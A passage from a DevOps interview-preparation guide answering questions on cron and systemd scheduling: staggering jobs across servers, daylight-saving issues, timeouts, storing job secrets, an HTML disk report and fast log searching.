     --expression-attribute-values "{\":now\":{\"N\":\"$now\"}}" 2>/dev/null || exit 0
   ```
3. Or a Postgres advisory lock, Consul `consul lock`, or etcd.
4. Make the job idempotent anyway, in case two runs happen.

**Why →** A distributed lock with expiry avoids both double runs and a stuck lock after a crash.

**Interview tip →** Lead with "move the schedule to one place"; it is simpler than any lock.

</details>

### Q95. A cron job on 500 servers uploads metrics to an API at `0 * * * *`. The API rate-limits and many uploads fail. Fix it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Thundering herd: every host fires at exactly the same second.

**What I'd do →**
1. With systemd timers: `RandomizedDelaySec=15min` and, on recent systemd, `FixedRandomDelay=true` so each host gets a stable offset.
2. With cron: a stable per-host delay derived from the hostname:
   ```bash
   delay=$(( $(hostname | cksum | cut -d' ' -f1) % 900 ))
   sleep "$delay"
   ```
3. Add retries with exponential backoff and jitter on HTTP 429.
4. Ask whether pull-based collection (Prometheus scraping) fits better than push.

**Why →** Spreading 500 requests across 15 minutes turns a spike into a trickle.

**Interview tip →** Mention a stable offset over a random one, so each host's run time is predictable for debugging.

</details>

### Q96. After a daylight-saving change, a 02:30 job ran twice on one day and not at all on another. How do you prevent this? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** In time zones with DST, 02:30 does not exist on the spring-forward day and occurs twice on the fall-back day. Cron implementations handle this differently.

**What I'd do →**
1. Run servers in UTC (`timedatectl set-timezone UTC`), which has no DST.
2. If a local time is a business requirement, use `OnCalendar=*-*-* 02:30:00 UTC` style explicit zones, or schedule outside the 01:00–03:00 window.
3. Make the job idempotent (date-stamped outputs, "already done today" check) so a double run is harmless.

**Why →** DST bugs only appear twice a year, which makes them hard to catch in testing.

**Interview tip →** Say "servers run in UTC" as a standard, and convert to local time only for display.

</details>

### Q97. A scheduled report job sometimes runs for hours and piles up. It must be killed if it exceeds one hour. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Enforce a hard limit at the scheduler level and handle the timeout clearly.

**What I'd do →**
1. systemd: `TimeoutStartSec=1h` in a `Type=oneshot` service; systemd sends `SIGTERM`, then `SIGKILL` after `TimeoutStopSec`, and marks the run failed (`Failed with result 'timeout'`).
2. cron: `flock -n /run/lock/report.lock timeout -k 60 1h /opt/jobs/report.sh`.
3. In the script, trap `TERM` to clean up partial output.
4. Alert on timeouts separately from errors, and investigate why it got slow.

**Why →** A hard limit stops runaway jobs from stacking up and exhausting resources.

**Interview tip →** Mention `timeout`'s exit code 124 so the wrapper can report "timed out" accurately.

</details>

### Q98. A scheduled job needs a database password. Where do you put it for cron and for systemd? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Keep it out of the crontab line, the unit file (world-readable in `/etc/systemd/system`), the script and Git.

**What I'd do →**
1. Cron: a file readable only by the job's user (`install -m 0600 -o jobuser`), read at runtime: `DB_PASS=$(< /etc/jobs/db_pass)`, or a tool-specific file like `~/.pgpass`.
2. systemd 247+: credentials, which are exposed only to the service:
   ```ini
   [Service]
   LoadCredential=db_pass:/etc/jobs/db_pass
   ExecStart=/opt/jobs/report.sh
   ```
   The script reads `"$CREDENTIALS_DIRECTORY/db_pass"`. `LoadCredentialEncrypted=` can keep it encrypted at rest with the TPM or host key.
3. Cloud: fetch from AWS Secrets Manager or SSM Parameter Store with the instance role at runtime.
4. Never use `Environment=DB_PASS=...` in a unit file; `systemctl show` reveals it.

**Why →** Each option limits who can read the secret and keeps it out of version control.

**Interview tip →** Mentioning `LoadCredential=` shows current systemd knowledge.

</details>

### Q99. Management wants a weekly email with disk usage of all servers as an HTML table. How do you build it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Collect data, render HTML with a here-doc, send with a mail tool.

**What I'd do →**
```bash
{
  cat <<'HTML'
<html><body><h3>Weekly disk usage</h3><table border="1" cellpadding="4">
<tr><th>Host</th><th>Mount</th><th>Used</th><th>Size</th><th>Use%</th></tr>
HTML
  for h in "${hosts[@]}"; do
    ssh -n -o ConnectTimeout=5 "$h" 'df -hP -x tmpfs -x devtmpfs' | awk -v h="$h" 'NR > 1 {
      style = ($5+0 >= 85) ? " style=\"background:#fdd\"" : ""
      printf "<tr%s><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>\n", style, h, $6, $3, $2, $5}'
  done
  echo '</table></body></html>'
} > /tmp/disk-report.html
mail -a 'Content-Type: text/html' -s "Disk usage $(date +%F)" ops@example.com < /tmp/disk-report.html
```
1. The `mail -a` header syntax is for GNU Mailutils; s-nail and msmtp differ, so test on your distro.
2. Highlight rows above 85% so readers see problems at a glance.

**Why →** A here-doc plus awk is enough for simple HTML; no templating engine needed.

**Interview tip →** Mention that a Grafana dashboard with alerts is better than an email nobody reads, but reports still have their place.

</details>

### Q100. You need to scan 50 GB of compressed logs for a request ID during an incident, as fast as possible. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** I/O and decompression are the bottlenecks; parallelize across files and use the fastest matching mode.

**What I'd do →**
```bash
find /var/log/app -name '*.gz' -print0 |
  xargs -0 -P "$(nproc)" -n 4 zgrep -F -H -- 'req-7f3a9c' > /tmp/hits.txt
```
1. `-F` fixed-string matching is much faster than regex; `LC_ALL=C` speeds it up further.
2. `-P $(nproc)` runs one decompressor per core; `-n 4` batches files.
3. Narrow by time first (file names or mtime) to read less data.
4. If installed, `rg -z -F` (ripgrep) searches compressed files in parallel by itself.
5. Run with `nice` on a production host, or copy logs elsewhere.

**Why →** Parallel decompression typically scales nearly linearly with cores until disk throughput becomes the limit.

**Interview tip →** Mention that this is the moment you wish logs were in a central, indexed system, and say how you would make that case after the incident.

</details>

<!-- DEVOPS-SHACK:FOOTER -->
---

<div align="center">

### 🚀 Made with ❤️ by [DevOps Shack](https://www.youtube.com/@devopsshack)

**Learn DevOps, DevSecOps, Cloud and Kubernetes the practical way.**

[▶️ YouTube — DevOps Shack](https://www.youtube.com/@devopsshack) · [▶️ Hindi — @shackverse](https://www.youtube.com/@shackverse) · [🎓 devopsshack.com](https://devopsshack.com) · [📸 Instagram @devopsshack](https://www.instagram.com/devopsshack)

[🏠 Back to Home](../README.md) · [⭐ Star the original repo](https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack)

<sub>© DevOps Shack · Licensed CC BY-NC-SA 4.0 · If you found this copy anywhere other than <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">github.com/jaiswaladi246</a>, the original and latest version is maintained by DevOps Shack.</sub>

</div>
<!-- /DEVOPS-SHACK:FOOTER -->
